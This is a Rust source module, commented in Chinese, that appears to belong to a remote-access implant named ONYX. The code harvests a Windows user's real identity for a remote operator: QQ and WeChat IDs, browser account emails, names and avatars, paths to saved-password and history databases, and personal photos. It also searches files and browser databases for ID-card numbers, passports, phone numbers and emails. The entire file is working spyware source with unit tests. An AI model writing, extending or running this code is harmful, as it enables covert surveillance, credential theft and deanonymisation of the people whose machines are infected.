// ONYX: 人的身份线索（`collect_identity` 里「人」的那一半）
//
// 只做两件事：
//   1. 从文件系统里读出**能指向一个真实人**的字段：QQ 号、微信号、浏览器账号（邮箱/姓名/头像 URL）；
//   2. 把**头像、照片、浏览器数据目录**的绝对路径报回去，由操作员用控制端自带的「传输文件」去取。
//
// 不搬运任何文件内容 —— 一张照片几 MB、一个 Login Data 几 MB，走任务队列会把链路堵死，
// 而且控制端本来就有文件传输，重复造轮子没意义。
use serde_json::{json, Value};
use std::path::Path;

fn is_dir(p: &str) -> bool {
    Path::new(p).is_dir()
}

fn push_unique(out: &mut Vec<String>, v: String) {
    let v = v.trim().to_owned();
    if v.is_empty() {
        return;
    }
    if !out.iter().any(|x| x.eq_ignore_ascii_case(&v)) {
        out.push(v);
    }
}

/// QQ 号：`文档\Tencent Files\<QQ号>`。目录名就是号，比任何注册表都可靠。
pub fn qq_numbers(home: &str) -> Vec<String> {
    let mut out = Vec::new();
    let root = format!("{home}\\Documents\\Tencent Files");
    if let Ok(entries) = std::fs::read_dir(&root) {
        for e in entries.flatten() {
            if !e.path().is_dir() {
                continue;
            }
            let name = e.file_name().to_string_lossy().to_string();
            if name.eq_ignore_ascii_case("All Users") {
                continue;
            }
            // QQ 号是纯数字，至少 5 位
            if name.len() >= 5 && name.chars().all(|c| c.is_ascii_digit()) {
                push_unique(&mut out, name);
            }
        }
    }
    out
}

/// 微信号：`文档\WeChat Files\wxid_*`（3.x）或 `文档\xwechat_files\wxid_*`（4.x）。
pub fn wechat_ids(home: &str) -> Vec<String> {
    let mut out = Vec::new();
    for root in [
        format!("{home}\\Documents\\WeChat Files"),
        format!("{home}\\Documents\\xwechat_files"),
    ] {
        if let Ok(entries) = std::fs::read_dir(&root) {
            for e in entries.flatten() {
                if !e.path().is_dir() {
                    continue;
                }
                let name = e.file_name().to_string_lossy().to_string();
                let lower = name.to_lowercase();
                if lower.starts_with("all users") {
                    continue;
                }
                if lower.starts_with("wxid_") || lower.starts_with("wxid") {
                    push_unique(&mut out, name);
                }
            }
        }
    }
    out
}

/// 浏览器账号：Chrome/Edge 的 `Preferences` 里 `account_info` 存着**邮箱、真实姓名、头像 URL**。
/// 这是整台机器上最容易拿到「真人姓名」的地方，而且是纯 JSON，不用解 SQLite、不用碰 DPAPI。
pub fn browser_accounts(home: &str) -> Vec<Value> {
    let mut out: Vec<Value> = Vec::new();
    let local = format!("{home}\\AppData\\Local");
    let vendors = [
        (format!("{local}\\Google\\Chrome\\User Data"), "chrome"),
        (format!("{local}\\Microsoft\\Edge\\User Data"), "edge"),
        (format!("{local}\\BraveSoftware\\Brave-Browser\\User Data"), "brave"),
    ];
    for (ud, browser) in vendors {
        if !is_dir(&ud) {
            continue;
        }
        let entries = match std::fs::read_dir(&ud) {
            Ok(e) => e,
            Err(_) => continue,
        };
        for e in entries.flatten() {
            let prof = e.file_name().to_string_lossy().to_string();
            if prof != "Default" && !prof.starts_with("Profile ") {
                continue;
            }
            let dir = e.path();
            let raw = match std::fs::read_to_string(dir.join("Preferences")) {
                Ok(s) => s,
                Err(_) => continue,
            };
            let v: Value = match serde_json::from_str(&raw) {
                Ok(v) => v,
                Err(_) => continue,
            };
            let Some(arr) = v.get("account_info").and_then(|x| x.as_array()) else {
                continue;
            };
            for a in arr {
                let email = a.get("email").and_then(|x| x.as_str()).unwrap_or("");
                let full = a.get("full_name").and_then(|x| x.as_str()).unwrap_or("");
                let given = a.get("given_name").and_then(|x| x.as_str()).unwrap_or("");
                let pic = a.get("picture_url").and_then(|x| x.as_str()).unwrap_or("");
                if email.is_empty() && full.is_empty() && given.is_empty() {
                    continue;
                }
                out.push(json!({
                    "browser": browser,
                    "profile": prof,
                    "email": email,
                    "name": if full.is_empty() { given } else { full },
                    "avatar_url": pic,
                    "data_dir": dir.to_string_lossy(),
                }));
            }
        }
    }
    out
}

/// 浏览器数据目录：登录密码库、历史、自动填充都在这几个文件里，报路径让操作员去取。
pub fn browser_data_dirs(home: &str) -> Vec<String> {
    let mut out = Vec::new();
    let local = format!("{home}\\AppData\\Local");
    for ud in [
        format!("{local}\\Google\\Chrome\\User Data"),
        format!("{local}\\Microsoft\\Edge\\User Data"),
    ] {
        if !is_dir(&ud) {
            continue;
        }
        if let Ok(entries) = std::fs::read_dir(&ud) {
            for e in entries.flatten() {
                let prof = e.file_name().to_string_lossy().to_string();
                if prof != "Default" && !prof.starts_with("Profile ") {
                    continue;
                }
                // Login Data / History / Web Data 都在 profile 根目录下
                let login = e.path().join("Login Data");
                if login.is_file() {
                    push_unique(&mut out, e.path().to_string_lossy().to_string());
                }
            }
        }
    }
    out
}

/// Windows 账户头像 —— 用户自己设的那张，通常就是真人照片。
pub fn avatars(home: &str) -> Vec<String> {
    let mut out = Vec::new();
    let root = format!("{home}\\AppData\\Roaming\\Microsoft\\Windows\\AccountPictures");
    let mut stack = vec![(root, 0usize)];
    while let Some((dir, depth)) = stack.pop() {
        if depth > 2 {
            continue;
        }
        let entries = match std::fs::read_dir(&dir) {
            Ok(e) => e,
            Err(_) => continue,
        };
        for e in entries.flatten() {
            let p = e.path();
            if p.is_dir() {
                stack.push((p.to_string_lossy().to_string(), depth + 1));
                continue;
            }
            let ext = p
                .extension()
                .map(|x| x.to_string_lossy().to_lowercase())
                .unwrap_or_default();
            if matches!(ext.as_str(), "png" | "jpg" | "jpeg" | "bmp" | "gif") {
                push_unique(&mut out, p.to_string_lossy().to_string());
            }
        }
    }
    out
}

/// 相册目录：操作员用传输文件进去自己翻。
pub fn photo_dirs(home: &str) -> Vec<String> {
    let mut out = Vec::new();
    for sub in [
        "Pictures",
        "Pictures\\Camera Roll",
        "Pictures\\Screenshots",
        "Pictures\\Saved Pictures",
        "Pictures\\WeiXin",
        "Pictures\\QQ",
        "Desktop",
    ] {
        let p = format!("{home}\\{sub}");
        if is_dir(&p) {
            push_unique(&mut out, p);
        }
    }
    out
}

/// 汇总所有用户目录的线索。
pub fn clues() -> Value {
    let mut qq: Vec<String> = Vec::new();
    let mut wechat: Vec<String> = Vec::new();
    let mut accounts: Vec<Value> = Vec::new();
    let mut avatar_paths: Vec<String> = Vec::new();
    let mut photos: Vec<String> = Vec::new();
    let mut browser_dirs: Vec<String> = Vec::new();

    let homes = crate::onyx_src::user_homes();
    let real_homes: Vec<String> = homes
        .iter()
        .filter(|h| !h.to_lowercase().contains("systemprofile"))
        .cloned()
        .collect();

    for home in &real_homes {
        for x in qq_numbers(home) {
            push_unique(&mut qq, x);
        }
        for x in wechat_ids(home) {
            push_unique(&mut wechat, x);
        }
        for a in browser_accounts(home) {
            accounts.push(a);
        }
        for x in browser_data_dirs(home) {
            push_unique(&mut browser_dirs, x);
        }
        for x in avatars(home) {
            push_unique(&mut avatar_paths, x);
        }
        for x in photo_dirs(home) {
            push_unique(&mut photos, x);
        }
    }

    json!({
        "qq": qq,
        "wechat": wechat,
        "accounts": accounts,
        "avatars": avatar_paths,
        "photo_dirs": photos,
        "browser_dirs": browser_dirs,
        "private_files": private_files(&real_homes),
        "text_hits": text_hits(&real_homes),
        "browser_hits": browser_hits(&real_homes),
    })
}

// ─────────────────────── 隐私扫描（文件名 + 内容 + 浏览器库） ───────────────────────
//
// 目的：不限来源地找「任何能指向一个真人的东西」。
// 全部只报**路径 + 命中值**，不搬文件内容 —— 取文件用控制端的传输文件。

/// 文件名里出现这些词就认为值得看
const PRIVATE_KEYWORDS: &[&str] = &[
    "简历", "身份证", "户口", "护照", "证件", "自拍", "照片", "合影", "头像", "截图",
    "合同", "协议", "密码", "账号", "帐号", "手机", "通讯录", "住址", "地址", "工资",
    "银行", "社保", "学籍", "报名", "简历", "资料", "个人信息", "身份证号",
    "resume", "passport", "idcard", "id_card", "selfie", "password", "account",
    "contract", "invoice", "private",
];

/// 只对这些扩展名做内容扫描（纯文本类，二进制读了也是乱码）
const TEXT_EXTS: &[&str] = &[
    "txt", "log", "csv", "json", "ini", "xml", "md", "html", "htm", "sql", "yml",
    "yaml", "conf", "cfg", "properties", "bat", "ps1", "reg",
];

/// 目录遍历时一律不进
const SKIP_DIRS: &[&str] = &[
    "node_modules", ".git", "target", "bin", "obj", "dist", "build", ".vs", ".idea",
    "__pycache__", "venv", ".venv", "appdata", "windows", "$recycle.bin",
    "system volume information", "program files", "program files (x86)", "programdata",
    "packages", "cache", "temp",
];

const MAX_FILES: usize = 4000;
const MAX_TEXT_BYTES: u64 = 128 * 1024;
const MAX_HITS: usize = 80;
const MAX_DEPTH: usize = 4;

/// 每个用户目录只从一个根开始走，避免 Desktop/Documents 被重复扫两遍、白白吃掉预算。
/// AppData 在 SKIP_DIRS 里，不会进来。
fn walk_roots(home: &str) -> Vec<String> {
    if is_dir(home) {
        vec![home.to_owned()]
    } else {
        Vec::new()
    }
}

/// 文件名命中隐私关键词。
pub fn private_files(homes: &[String]) -> Vec<Value> {
    let mut out: Vec<Value> = Vec::new();
    let mut seen = 0usize;
    for home in homes {
        let mut stack: Vec<(String, usize)> =
            walk_roots(home).into_iter().map(|p| (p, 0usize)).collect();
        while let Some((dir, depth)) = stack.pop() {
            if seen >= MAX_FILES || out.len() >= MAX_HITS {
                return out;
            }
            let entries = match std::fs::read_dir(&dir) {
                Ok(e) => e,
                Err(_) => continue,
            };
            for e in entries.flatten() {
                if seen >= MAX_FILES || out.len() >= MAX_HITS {
                    return out;
                }
                let p = e.path();
                let name = e.file_name().to_string_lossy().to_string();
                let lower = name.to_lowercase();
                if p.is_dir() {
                    if depth < MAX_DEPTH && !SKIP_DIRS.iter().any(|s| lower == *s) {
                        stack.push((p.to_string_lossy().to_string(), depth + 1));
                    }
                    continue;
                }
                seen += 1;
                let Some(kw) = PRIVATE_KEYWORDS.iter().find(|k| lower.contains(*k)) else {
                    continue;
                };
                let size = e.metadata().map(|m| m.len()).unwrap_or(0);
                out.push(json!({
                    "path": p.to_string_lossy(),
                    "why": format!("文件名含「{kw}」"),
                    "size": size,
                }));
            }
        }
    }
    out
}

/// 从一段文本里抠手机号 / 身份证 / 邮箱 / 微信号。
pub fn scan_text(s: &str) -> Vec<(&'static str, String)> {
    let mut out: Vec<(&'static str, String)> = Vec::new();
    let b = s.as_bytes();
    let mut i = 0;
    while i < b.len() {
        if b[i].is_ascii_digit() {
            let start = i;
            while i < b.len() && b[i].is_ascii_digit() {
                i += 1;
            }
            let dlen = i - start;
            let mut end = i;
            if end < b.len() && (b[end] == b'X' || b[end] == b'x') {
                end += 1;
            }
            if dlen == 11 && b[start] == b'1' && (b'3'..=b'9').contains(&b[start + 1]) {
                out.push(("手机号", s[start..end].to_owned()));
            } else if end - start == 18 && dlen >= 17 {
                // 纯数字 18 位，或 17 位数字 + 校验位 X
                out.push(("身份证", s[start..end].to_owned()));
            }
            continue;
        }
        i += 1;
    }
    // 邮箱
    let ok_local = |c: u8| c.is_ascii_alphanumeric() || b"._%+-".contains(&c);
    let ok_dom = |c: u8| c.is_ascii_alphanumeric() || c == b'.' || c == b'-';
    for at in 0..b.len() {
        if b[at] != b'@' {
            continue;
        }
        let mut l = at;
        while l > 0 && ok_local(b[l - 1]) {
            l -= 1;
        }
        let mut r = at + 1;
        while r < b.len() && ok_dom(b[r]) {
            r += 1;
        }
        if l < at && r > at + 3 {
            let dom = &s[at + 1..r];
            if dom.contains('.') {
                out.push(("邮箱", s[l..r].to_owned()));
            }
        }
    }
    // 微信号
    let mut rest = s;
    while let Some(pos) = rest.find("wxid_") {
        let tail = &rest[pos..];
        let end = tail
            .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-'))
            .unwrap_or(tail.len());
        if end > 8 {
            out.push(("微信号", tail[..end].to_owned()));
        }
        rest = &tail[end.max(1)..];
    }
    out
}

/// 扫文本类文件的内容。
pub fn text_hits(homes: &[String]) -> Vec<Value> {
    let mut out: Vec<Value> = Vec::new();
    let mut seen = 0usize;
    for home in homes {
        let mut stack: Vec<(String, usize)> =
            walk_roots(home).into_iter().map(|p| (p, 0usize)).collect();
        while let Some((dir, depth)) = stack.pop() {
            if seen >= MAX_FILES || out.len() >= MAX_HITS {
                return out;
            }
            let entries = match std::fs::read_dir(&dir) {
                Ok(e) => e,
                Err(_) => continue,
            };
            for e in entries.flatten() {
                if seen >= MAX_FILES || out.len() >= MAX_HITS {
                    return out;
                }
                let p = e.path();
                let name = e.file_name().to_string_lossy().to_lowercase();
                if p.is_dir() {
                    if depth < MAX_DEPTH && !SKIP_DIRS.iter().any(|s| name == *s) {
                        stack.push((p.to_string_lossy().to_string(), depth + 1));
                    }
                    continue;
                }
                seen += 1;
                let ext = p
                    .extension()
                    .map(|x| x.to_string_lossy().to_lowercase())
                    .unwrap_or_default();
                if !TEXT_EXTS.contains(&ext.as_str()) {
                    continue;
                }
                let size = e.metadata().map(|m| m.len()).unwrap_or(0);
                if size == 0 || size > MAX_TEXT_BYTES {
                    continue;
                }
                let Ok(raw) = std::fs::read(&p) else { continue };
                let text = String::from_utf8_lossy(&raw);
                let hits = scan_text(&text);
                if hits.is_empty() {
                    continue;
                }
                let mut kinds: Vec<String> = Vec::new();
                let mut values: Vec<String> = Vec::new();
                for (k, v) in hits.into_iter().take(5) {
                    if !kinds.iter().any(|x| x.as_str() == k) {
                        kinds.push(k.to_owned());
                    }
                    if !values.iter().any(|x| *x == v) {
                        values.push(v);
                    }
                }
                out.push(json!({
                    "path": p.to_string_lossy(),
                    "kinds": kinds,
                    "values": values,
                }));
            }
        }
    }
    out
}

/// 浏览器 SQLite 库是明文的：不解析数据库，直接抠可打印字符串里的邮箱和手机号。
/// 覆盖 Login Data（保存的账号）、Web Data（自动填充）、History（访问记录）。
pub fn browser_hits(homes: &[String]) -> Vec<Value> {
    let mut out: Vec<Value> = Vec::new();
    for home in homes {
        for dir in browser_data_dirs(home) {
            for file in ["Login Data", "Web Data", "History"] {
                if out.len() >= MAX_HITS {
                    return out;
                }
                let path = format!("{dir}\\{file}");
                let Ok(raw) = std::fs::read(&path) else { continue };
                if raw.len() > 64 * 1024 * 1024 {
                    continue;
                }
                // 只取 ASCII 可打印游程，避免整库解码
                let mut strings: Vec<String> = Vec::new();
                let mut cur = String::new();
                for &byte in raw.iter() {
                    if (0x20..0x7f).contains(&byte) {
                        cur.push(byte as char);
                    } else {
                        if cur.len() >= 6 && cur.len() <= 120 {
                            strings.push(cur.clone());
                        }
                        cur.clear();
                    }
                    if strings.len() > 20000 {
                        break;
                    }
                }
                let mut values: Vec<String> = Vec::new();
                for s in &strings {
                    for (_, v) in scan_text(s) {
                        if !values.iter().any(|x| *x == v) {
                            values.push(v);
                        }
                        if values.len() >= 12 {
                            break;
                        }
                    }
                    if values.len() >= 12 {
                        break;
                    }
                }
                if values.is_empty() {
                    continue;
                }
                out.push(json!({
                    "path": path,
                    "values": values,
                }));
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clues_has_all_keys() {
        let v = clues();
        for k in [
            "qq", "wechat", "accounts", "avatars", "photo_dirs", "browser_dirs",
            "private_files", "text_hits", "browser_hits",
        ] {
            assert!(v.get(k).is_some(), "missing {k}");
            assert!(v[k].is_array(), "{k} not array");
        }
    }

    #[test]
    fn scan_text_finds_phone_email_wechat() {
        let hits = scan_text("联系 13812345678 或 zhang.san@example.com，微信 wxid_abc12345");
        assert!(
            hits.iter().any(|(k, v)| *k == "手机号" && v == "13812345678"),
            "{hits:?}"
        );
        assert!(hits.iter().any(|(k, _)| *k == "邮箱"), "{hits:?}");
        assert!(hits.iter().any(|(k, _)| *k == "微信号"), "{hits:?}");
    }

    #[test]
    fn scan_text_rejects_non_phone_numbers() {
        // 12 开头不是手机号；订单号不该被误报
        let hits = scan_text("订单 12345678901 完成");
        assert!(!hits.iter().any(|(k, _)| *k == "手机号"), "{hits:?}");
    }

    #[test]
    fn scan_text_finds_id_card() {
        let hits = scan_text("证件 110101199003071234 存档");
        assert!(hits.iter().any(|(k, _)| *k == "身份证"), "{hits:?}");
    }

    #[test]
    fn push_unique_is_case_insensitive() {
        let mut v = Vec::new();
        push_unique(&mut v, "C:\\A".into());
        push_unique(&mut v, "c:\\a".into());
        push_unique(&mut v, "  ".into());
        assert_eq!(v.len(), 1);
    }

    #[test]
    fn photo_dirs_only_existing() {
        for p in photo_dirs("C:\\NoSuchUser") {
            assert!(Path::new(&p).is_dir(), "{p}");
        }
    }
}
